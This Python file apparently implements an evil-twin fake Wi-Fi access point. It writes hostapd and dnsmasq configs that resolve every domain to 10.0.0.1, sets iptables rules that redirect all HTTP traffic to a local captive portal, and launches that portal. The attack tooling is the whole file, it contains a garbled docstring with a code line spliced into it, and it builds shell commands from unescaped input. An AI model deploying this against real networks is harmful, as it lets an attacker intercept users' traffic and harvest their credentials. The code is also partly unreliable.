import os


def reset_setting(interface=None):
    # Stop and kill the hostapd and dnsmasq services.
    os.system('service hostapd stop')  # hostapd (host access point daemon) access point
    os.system('service dnsmasq stop')  # dsnmasq to enable DNS and DHCP server
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('systemctl unmask systemd-resolved >/dev/null 2>&1')
    os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl start systemd-resolved >/dev/null 2>&1')
    # drop all iptables rules
    os.system('sudo iptables -F') # Flush the selected chain (all the chains in the table if none is given). This is equivalent to deleting all the rules one by one
    os.system('sudo iptables -X') # Deletes the optional user-defined chain specified
    os.system('sudo iptables --table nat -F')
    os.system('sudo iptables --table nat -X')
    os.system('sudo iptables -P OUTPUT ACCEPT')
    os.system('sudo iptables -P INPUT ACCEPT')
    os.system('sudo iptables -P FORWARD ACCEPT')
    if interface is not None:
        # Start system network service
        # os.system('service NetworkManager start')
        os.system('nmcli dev set ' + interface + ' managed yes')
    os.system('echo 0 > captive_portal/flag.txt')


def fake_AP_setup(interface):
    os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl mask systemd-resolved >/dev/null 2>&1')
    # Stops system network services
    os.system('nmcli dev set ' + interface + ' managed no')
    # Define the interface to be used as the fake AP & Define the fake AP IP address and subnet mask.
    os.system('ifconfig ' + interface + ' inet 10.0.0.1 netmask 255.255.255.0')
    # Define the default gateway.
    os.system('route add default gw 10.0.0.1')
    # Enable IP forwarding (1 indicates to enable / 0 indicates to disable)
    # IP forwarding/Internet routing - is a process used to determine which path a packet or datagram can be sent.
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    """
    iptables
    --table nat / work on the nat table
    --append PRERO    os.system('sudo iptables -P FORWARD ACCEPT')UTING / append the rule to the pre routing chain
    --protocol tcp / match packets with tcp protocol
    --dport 80 / match packet going to port 80
    --jump REDIRECT / if rule matched jump to redirect target
    --to 8080 / change destination to port 8080
    """
    os.system('sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump REDIRECT --to-port 8080')

    os.system(
        'sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump DNAT --to-destination '
        '10.0.0.1:8080')

    os.system('sudo iptables --table nat --append OUTPUT --protocol tcp --dport 80 --jump REDIRECT --to-port 8080')

    os.system(
        'sudo iptables --table nat --append OUTPUT --protocol tcp --dport 80 --jump DNAT --to-destination 10.0.0.1:8080')

    os.system('sudo iptables --table nat --append POSTROUTING --out-interface ' + interface + ' --jump MASQUERADE')
    os.system('sudo iptables -P FORWARD ACCEPT')
    os.system('sudo iptables -A INPUT -j ACCEPT >> /dev/null 2>&1')
    os.system('sudo iptables -A OUTPUT -j ACCEPT >> /dev/null 2>&1')


def run_fake_ap(ap_name):
    # Link the dnsmasq to the configuration file.
    os.system('dnsmasq -C dnsmasq.conf')
    # Start web server
    command = '"cd captive_portal && npm start ' + '"' + ap_name + '"' + '"'
    os.system('gnome-terminal -- sh -c ' + command)
    # Link the hostapd to the configuration file.
    os.system('hostapd hostapd.conf -B')


def hostapd_conf(interface, essid):
    setup = "interface=" + interface + "\nssid=" + essid + "\nchannel=11\ndriver=nl80211\nhw_mode=g\nmacaddr_acl=0" \
                                                           "\nignore_broadcast_ssid=0 "
    try:
        os.remove("hostapd.conf")
    except:
        pass
    hostapd = open("hostapd.conf", "w+")
    hostapd.write(setup)


def dnsmasq_conf(interface):
    setup = "interface=" + interface + "\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6," \
                                       "10.0.0.1\naddress=/#/10.0.0.1"
    try:
        os.remove("dnsmasq.conf")
    except:
        pass
    dnsmasq = open("dnsmasq.conf", "w+")
    dnsmasq.write(setup)


def remove_conf_files():
    try:
        os.remove("dnsmasq.conf")
    except OSError:
        pass
    try:
        os.remove("hostapd.conf")
    except OSError:
        pass
